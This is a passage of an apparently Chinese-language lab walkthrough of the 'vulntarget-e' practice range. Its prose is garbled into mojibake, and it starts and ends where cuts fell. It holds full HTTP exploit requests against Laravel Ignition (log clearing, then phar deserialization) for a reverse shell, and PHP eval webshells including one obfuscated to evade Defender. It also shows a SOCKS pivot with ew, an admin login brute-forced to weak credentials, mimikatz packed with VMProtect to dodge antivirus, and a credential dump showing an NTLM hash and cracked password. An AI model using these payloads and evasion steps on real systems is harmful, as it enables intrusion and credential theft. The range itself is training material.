class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=49=00=43</span>=<span class="number">00=31=00=70</span>=<span class="number">00=49=00=44</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=46=00=38</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=32</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=43=00=34</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=44=00=51</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=49</span>=<span class="number">00=34=00=49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=67=00=50</span>=<span class="number">00=69=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=69=00=63</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=42</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=63=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=54=00=73</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=68</span>=<span class="number">00=70=00=64</span>=<span class="number">00=44=00=73</span>=<span class="number">00=67=00=50</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=34=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=66</span>=<span class="number">00=51=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=52=00=34</span>=<span class="number">00=64=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=55</span>=<span class="number">00=33=00=59</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00=51=00=58</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=69=00=57</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=76</span>=<span class="number">00=55=00=64</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=41=00=44</span>=<span class="number">00=44=00=62</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=69=00=43</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=74=00=77</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=48</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=43</span>=<span class="number">00</span>a&quot;</span></span><br><span class="line"><span class="dns">  &#125;</span></span><br><span class="line"><span class="dns">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201330580.png" alt="image-20221129201330580"></p><p>å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œæ¸…ç©ºå¯¹logæ–‡ä»¶ä¸­çš„å¹²æ‰°å­—ç¬¦ï¼Œåªç•™ä¸‹POCï¼šè¿”å›200</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>299</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201505852.png" alt="image-20221129201505852"></p><p>ä½¿ç”¨phar://è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼ˆæœ‰çš„æ–‡ç« è¯´ç›¸å¯¹è·¯å¾„ï¼Œæœ‰çš„ç»å¯¹è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…è§‰å¾—è¿˜æ˜¯ç›¸å¯¹è·¯å¾„å¥½ç”¨ï¼Œç»å¯¹è·¯å¾„æ²¡å‡ºï¼Œå¦‚æœæƒ³ç”¨ç»å¯¹è·¯å¾„ï¼Œä¸Šé¢500æŠ¥é”™å“ªé‡Œæœ‰è·¯å¾„ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨ç›¸å¯¹å§ï¼‰ï¼šè¿™é‡Œè¦å…ˆncç›‘å¬ä¸€ä¸‹<br><code>nc -lvnp 9999</code>shellå°±è¿‡æ¥äº†ï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>204</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201932533.png" alt="image-20221129201932533"></p><p>è¿™é‡Œæˆ‘ä»¬å°±æ‹¿åˆ°shelläº†ï¼Œä½†æ˜¯ä¼ æ–‡ä»¶å¯èƒ½ä¸å¤ªå¥½ç”¨ï¼Œè¦åå‘ä¸‹è½½ï¼Œæˆ‘ä»¬è¿™é‡Œåˆ°webè·Ÿè·¯å¾„å†™ä¸ªğŸåé¢æ–¹ä¾¿ä¼ æ–‡ä»¶ä¸‹è½½å•¥çš„ã€‚éœ€è¦æ³¨æ„ï¼Œè¿™ä¸ªæ‰§è¡Œå°±åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œä¸Šé¢å·²ç»è¯´è¿‡äº†ï¼Œæ—¥å¿—æ–‡ä»¶ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœæ²¡æ‰“æˆåŠŸå°±è¦é‡æ–°æ¥ä¸€éï¼Œè€Œä¸”ç¬¬ä¸€æ¬¡æ¸…ç©ºæ—¥å¿—çš„æ—¶å€™ä¸€å®šè¦è¿”å›200æ‰ç®—æ¸…ç©ºæˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/public</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[g]);?&gt;&#x27;</span> &gt; a.php</span><br><span class="line">cat a.php</span><br><span class="line">http://192.168.144.55/a.php</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129203359747.png" alt="image-20221129203359747"></p><p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼Œç¯å¢ƒå¹¶æ²¡æœ‰è£…net-toolsï¼Œæ²¡æœ‰ifconfig ï¼Œæ‰€ä»¥æˆ‘ä»¬<code>ip a</code> ä¹Ÿå¯ä»¥æŸ¥çœ‹ipï¼Œä¸¤å—ç½‘å¡ï¼Œå†…ç½‘è¿˜æœ‰ä¸€ä¸ª20çš„æ®µ</p><p><img src="/images/vulntarget-e/image-20221129203818846.png" alt="image-20221129203818846"></p><p>ç„¶åä¸Šä¸ªlse æˆ–è€…linux-exploit-suggester-master è¿›è¡Œææƒä¸€ä¸‹ï¼Œå½“ç„¶ä¸æä¹Ÿæ²¡å…³ç³»ï¼Œä¸å½±å“åé¢ã€‚è¿™é‡Œç¬”è€…æŠŠä¸Šé¢ä¸¤ä¸ªææƒè¾…åŠ©å·¥å…·éƒ½è·‘äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¥½çš„ææƒæ–¹æ³•ï¼Œçœ‹äº†çœ¼wpï¼Œè¯´æœ‰å¼±å£ä»¤ã€‚é‚£è‚¯å®šæ˜¯çœ‹passwdæ–‡ä»¶ï¼ŒçŸ¥é“ç”¨æˆ·å<code>vulntarget</code>ï¼Œç„¶åçˆ†ç ´ä¸€ä¸‹ã€‚</p><p><img src="/images/vulntarget-e/image-20221129211426271.png" alt="image-20221129211426271"></p><p>é‚£è¿™æ ·çš„è¯ï¼Œè¿ä¸Šå»å°±å¯ä»¥äº†ã€‚æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ç”¨èšå‰‘å§</p><p><img src="/images/vulntarget-e/image-20221129213522722.png" alt="image-20221129213522722"></p><p>./fscan_amd64 -h 10.0.20.141/24 -o a.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.141/24 -o a.txt</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¼¼ä¹å¹¶æ²¡æœ‰æ‰«åˆ°å†…ç½‘ï¼Œå› ä¸ºè¿™å°æ˜¯winçš„æœºå™¨ï¼Œå¯èƒ½æ˜¯é˜²ç«å¢™çš„ä½œç”¨ã€‚æˆ‘ä»¬åŠ ä¸ªnp ç¦pingæ‰«</span><br><span class="line"></span><br><span class="line">./fscan_amd64 -h 10.0.20.141/24 -pn -o s.txt</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">10.0.20.100:80 open</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.100:443 open</span><br><span class="line">[*] WebTitle:https://10.0.20.100       code:403 len:301    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line">[*] WebTitle:http://10.0.20.100        code:200 len:42     title:Online Veterinary Appointment System - PHP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ª100çš„æœºå™¨ï¼Œä¸”å¼€äº†80å¹¶ä¸”æ˜¯ä¸€ä¸ªwinserver,æŒ‚ä»£ç†è®¿é—®</p><p>é‚£ä¹ˆç›´æ¥ä¸Šä»£ç†ï¼Œè¿™é‡Œç¬”è€…ä¸Šewï¼ŒæŠŠå†…ç½‘å¸¦å‡ºæ¥ã€‚æ‹–ä¸ªewä¸Šå»ï¼Œæ”¹ä¸€ä¸‹777æƒé™.å½“ç„¶å…¶ä»–ä»£ç†è½¯ä»¶ä¹Ÿè¡Œï¼Œä¸å”¯ä¸€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 8887</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129215012297.png" alt="image-20221129215012297"></p><p><img src="/images/vulntarget-e/image-20221129215310468.png" alt="image-20221129215310468"></p><p>ç”¨proxifieråŠ ä¸ªserversåœ°å€å†™å¤–ç½‘åœ°å€ï¼Œç«¯å£å†™ä»£ç†ç«¯å£</p><p>æ–°åŠ ä¸€ä¸ªè§„åˆ™ï¼Œæˆ‘ä»¬å†™é€šå¾€20çš„æ®µï¼Œèµ°ä»£ç†</p><p><img src="/images/vulntarget-e/image-20221129215644648.png" alt="image-20221129215644648"></p><p><img src="/images/vulntarget-e/image-20221129215733868.png" alt="image-20221129215733868"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°èƒ½æˆåŠŸè®¿é—®20æ®µipäº†ã€‚</p><p>è®°ä¸€ä¸ªå‘ï¼šæˆ‘åœ¨ä¸Šå®Œewåå¯åŠ¨äº†ä¹‹åä½¿ç”¨è°·æ­Œå¸¦çš„é‚£ä¸ªæ’ä»¶[SwitchyOmega] ä¹ŸåŠ äº†ä¸€ä¸ªä»£ç†ï¼Œç„¶åå»è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œå‰å‡ æ¬¡è¿˜è¡Œï¼Œä¸‰äº”æ¡è®¿é—®ä¹‹åè¿™ä¸ªé“¾è·¯å°±æŒ‚äº†ï¼Œ</p><p>linuxä¸­ewæŠ¥<code>Segmentation fault (core dumped)</code> å…ˆå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ewç‰ˆæœ¬ä¸å¯¹æˆ–è€…èšå‰‘æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜ï¼Œå› ä¸ºä»¥å‰æ²¡æœ‰å‡ºç°è¿‡è¿™ä¸ªæƒ…å†µï¼Œæˆ‘åˆå»shellé‡Œæµ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ï¼Œæµè§ˆå™¨å¯èƒ½æœ‰æ’ä»¶å¯èƒ½ä¼šè®¿é—®è°·æ­Œæˆ–è€…å…¶ä»–å¤–ç½‘ï¼Œç„¶åå°±åœæ‰äº†ã€‚æˆ‘ç”¨äº†proxifieråªåŠ ç›®æ ‡åœ°å€æ®µæ²¡æœ‰å‡ºç°ä»»ä½•é—®é¢˜ã€‚å¯èƒ½æ˜¯è®¿é—®å¤–ç½‘çš„åŸå› ã€‚æ²¡å…³ç³»ï¼Œè§£å†³äº†å°±å¥½äº†</p><p><img src="/images/vulntarget-e/image-20221129221150992.png" alt="image-20221129221150992"></p><h3 id="OVAS-PHP-æ¼æ´æ‹¿shellï¼Œå…æ€df"><a href="#OVAS-PHP-æ¼æ´æ‹¿shellï¼Œå…æ€df" class="headerlink" title="OVAS - PHP æ¼æ´æ‹¿shellï¼Œå…æ€df"></a>OVAS - PHP æ¼æ´æ‹¿shellï¼Œå…æ€df</h3><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªcmsï¼Œåˆšå¼€å§‹æ‰“çš„æ—¶å€™ï¼Œæˆ‘å»googleäº†ä¸€åœˆä¹Ÿæ‰¾åˆ°åˆ©ç”¨çš„æ–¹æ³•ï¼Œç”šè‡³è¿æåˆ°è¿™ä¸ªcmsçš„æ–‡ç« éƒ½å¾ˆå°‘ï¼Œï¼ˆé™¤äº†å…¶ä»–ä½¬å†™çš„wpï¼‰ï¼Œå°±å»æ‰«äº†ç›®å½•çœ‹çœ‹æœ‰å•¥æç¤ºã€‚ç„¶åå›æ¥å†çœ‹çœ‹å‘ç°å³ä¸Šè§’æœ‰ä¸ªadminlogin ï¼Œè¯•ç€æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬çœ‹åˆ°usernameï¼Œpasswordéƒ½æ˜¯æ˜æ–‡ä¸”æ²¡æœ‰éªŒè¯ç ï¼Œå­˜åœ¨çˆ†ç ´çš„æ¡ä»¶ï¼Œæˆ‘ä»¬åŠ è½½å­—å…¸çˆ†ç ´ä¸€ä¸‹ã€‚çˆ†ç ´æˆåŠŸadminï¼Œadmin123</p><p><img src="/images/vulntarget-e/image-20221129221707205.png" alt="image-20221129221707205"></p><p><img src="/images/vulntarget-e/image-20221129221813516.png" alt="image-20221129221813516"></p><p>æˆ‘ä»¬ç™»å½•åå°ï¼Œé‚£è‚¯å®šæ˜¯æƒ³åŠæ³•æ‹¿shelläº†ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å•¥ä¸Šä¼ ç‚¹ï¼Œç»è¿‡æµ‹è¯•åœ¨settingsä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼Œsettingsä¸­åœ¨welcomeä¸­æ·»åŠ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶ååœ¨éšä¾¿é€‰ä¸€ä¸ªå›¾ç‰‡ï¼Œç‚¹æœ€ä¸‹é¢updateæäº¤</p><p><img src="/images/vulntarget-e/image-20221130103146247.png" alt="image-20221130103146247"></p><p>ç„¶ååœ¨ä½ æ’çš„é‚£å¼ å›¾ç‰‡ä¸­çš„base64ç¼–ç ä¸­æ’å…¥ä¸€å¥è¯ï¼Œåœ¨æœ€å¼€å§‹æ²¡çœ‹wpçš„æ—¶å€™ï¼Œæˆ‘å°±å†™äº†ç®€å•çš„phpinfoæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæˆ‘ä¸Šä¼ æ™®é€šä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶å°±æŠ¥é”™ï¼Œä¸»é¡µé¢æ˜¾ç¤ºincludeé”™è¯¯ï¼Œä»¥ä¸ºæ˜¯å“ªé‡Œæ‰“é”™äº†ï¼Œç½‘ç«™å´©äº†ï¼Œåæ¥å‘ç°å¹¶ä¸æ˜¯ï¼Œæˆ‘ç™»ä¸Šå»winå‘ç°ï¼Œwinä¸Šå¼€çš„æœ‰dfï¼Œç›´æ¥æŠŠæˆ‘çš„ğŸå„¿æ€äº†ï¼Œphpinfoä¸æ€ï¼Œä¸è¿‡ä¹Ÿæ²¡å…³ç³»ï¼Œdfå¯¹webshellæŸ¥æ€çš„èƒ½åŠ›æ¯”è¾ƒå·®ï¼Œç½‘ä¸Šéšä¾¿æ‰¾ä¸ªç®€å•å…æ€å°±èƒ½è¿‡ã€‚è¿™é‡Œç¬”è€…æä¾›ä¸€ä¸ªã€‚æ—¢ç„¶ç™»ä¸Šå»äº†ï¼Œç¬”è€…å°±æŠŠdfæ›´æ–°åˆ°æœ€æ–°ç‰ˆäº†ï¼Œè¿™ä¸ªğŸå„¿ä¾ç„¶èƒ½ç”¨ã€‚ä¸‹é¢éƒ½æ˜¯åŸºäºåšæ–°ç‰ˆçš„dfï¼Œtime-22.11.28</p><p><img src="/images/vulntarget-e/image-20221130200829649.png" alt="image-20221130200829649"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bohemian</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/*bohemian*/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;g&#x27;</span>].<span class="string">&quot;/*bohemian**/&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">@<span class="keyword">eval</span>(bohemian());phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130104355866.png" alt="image-20221130104355866"></p><p>è¿™é‡ŒæŠŠåŒ…å‘è¿‡å»å°±å¯ä»¥äº†ï¼Œé‡Œé¢æœ‰ä¸ªphpinfo æˆ‘ä»¬æ–¹ä¾¿æŸ¥çœ‹ï¼Œå»åˆ°ä¸»é¡µçœ‹çœ‹</p><p><img src="/images/vulntarget-e/image-20221130103829535.png" alt="image-20221130103829535"></p><p><img src="/images/vulntarget-e/image-20221130110109643.png" alt="image-20221130110109643"></p><p>æ²¡æœ‰é—®é¢˜ï¼Œèšå‰‘è¿ä¸€ä¸‹ã€‚æˆåŠŸæ‹¿åˆ°shell</p><p><img src="/images/vulntarget-e/image-20221130110051787.png" alt="image-20221130110051787"></p><p>ä¸Šæ¥å°±èƒ½çœ‹åˆ°systemæƒé™ï¼Œä¸”æœ‰ä¸¤å—ç½‘å¡ï¼Œå†…éƒ¨è¿˜æœ‰ä¸€ä¸ª10çš„æ®µ</p><p><img src="/images/vulntarget-e/image-20221130110251974.png" alt="image-20221130110251974"></p><p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢æˆ‘ä»¬çŸ¥é“æ˜¯å¼€ç€dfçš„å…ˆå»æ¡Œé¢ç¿»ç¿»çœ‹ï¼Œæ¡Œé¢ä¸Šæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯è¿™ä¸ªç›®å½•C:/Users/Administrator/æœ‰ä¸ªflagæ–‡ä»¶ï¼Œå†…å®¹<code>vulntarget&#123;VGhlIGhvc3QgcGFzc3dvcmQgbWF5IGJlIHVzZWQgZm9yIG90aGVyIHB1cnBvc2Vz&#125;  +_+</code>å…¸å‹çš„base64  è§£ä¸€ä¸‹ï¼Œ<code>The host password may be used for other purposes</code>ç¬”è€…å·¥åœ°è‹±è¯­ç¿»ä¸€ä¸‹ï¼Œå¤§è‡´çš„æ„æ€æ˜¯è¿™ä¸ªç”µè„‘çš„å¯†ç ä¼šè¢«ç”¨åˆ°å…¶ä»–åœ°æ–¹ã€‚é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šå»æŠ“å¯†ç äº†ã€‚é‚£å°±åœ¨è¿™ç½‘ç«™è·¯å¾„ä¸‹ç©¿ä¸ªmimikatzï¼Œå½“ç„¶æˆ‘ä»¬ä¼ ä¸Šå»è‚¯å®šç§’æ€ï¼Œdfå¯¹mimikatzéå¸¸æ•æ„Ÿçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å‘¢å»åšä¸€ä¸ªç®€å•å…æ€ã€‚</p><p>å¦‚æœæƒ³æ·±å…¥ç ”ç©¶mimikatzçš„å…æ€ï¼Œå‚è€ƒè¿™ä½ä½¬çš„æ–‡ç« ï¼ŒMimikatzçš„18ç§å…æ€å§¿åŠ¿åŠé˜²å¾¡ç­–ç•¥<code>https://www.freebuf.com/news/234365.html</code></p><p>è¿™é‡Œç¬”è€…æä¾›ä¸€ç§éå¸¸ç®€å•çš„å…æ€æ“ä½œï¼Œå°±æ˜¯åŠ å£³ï¼Œéå¸¸ç®€å•æ‹¿å·¥å…·å»ç”Ÿæˆä¸€ä¸ªå°±è¡Œã€‚</p><p><code>å½“ç„¶è¿™é‡Œå…æ€çš„æ“ä½œå…¶å®éƒ½å¯ä»¥ä¸åšï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºä¸Šé¢å…¶å®æˆ‘ä»¬å·²ç»æ˜¯systemæƒé™äº†ï¼Œæˆ‘ä»¬å…¶å®æŠŠdfå…³æ‰å°±è¡Œï¼Œä½†æ˜¯è¿™é‡Œæ˜¯é¶åœºï¼Œè”ç³»ä¸€ä¸‹æ²¡æœ‰åå¤„</code></p><p>ä¸‹é¢æˆ‘ä»¬å…ˆå¯¹mimikatzå…æ€ï¼Œæ‰“å¼€VMProtect,é€‰æ‹©mimikatzå°±è¡Œäº†ï¼Œä»–å°±ä¼šç¼–è¯‘äº†ï¼Œç„¶åä¼šç”Ÿæˆmimikatzvm.vmp.exeï¼ŒæŠŠè¿™ä¸ªä¼ ä¸Šå»å°±è¡Œäº†</p><p><img src="/images/vulntarget-e/image-20221130112521657.png" alt="image-20221130112521657"></p><p><img src="/images/vulntarget-e/image-20221130112528427.png" alt="image-20221130112528427"></p><p>è¿™é‡Œæ²¡æœ‰äº¤äº’å¼shellæˆ‘ä»¬ç”¨mimikatzæŠ“çš„è¯ï¼Œç›´æ¥å¯¼å‡ºç»“æœå°±è¡Œ</p><p><code>mimikatzvm.vmp.exe &quot;sekurlsa::logonpasswords&quot; exit &gt; s.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msv :</span><br><span class="line"> [00000005] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : WIN-JJJBQ4N87RA</span><br><span class="line"> * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line"> * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>dfc8d2bfa540a0a6e2248a82322e654e<br>ntlm<br>Admin#123</p><p>md5ç½‘ç«™è§£ä¸€ä¸‹å°±æœ‰äº†ï¼Œ</p><p>æˆ‘ä»¬åœ¨ä¸Šä¸ªfscanæ‰«ä¸‹ä¸‹ä¸ªç½‘æ®µï¼Œä¸Šä¸ªwinçš„ï¼Œè¿™é‡Œä¸Šä¼ ä¸Šå»ç›´æ¥æŠ¥æ¯’äº†ï¼Œç„¶åæ€æ‰äº†</p><p><img src="/images/vulntarget-e/image-20221130201732733.png" 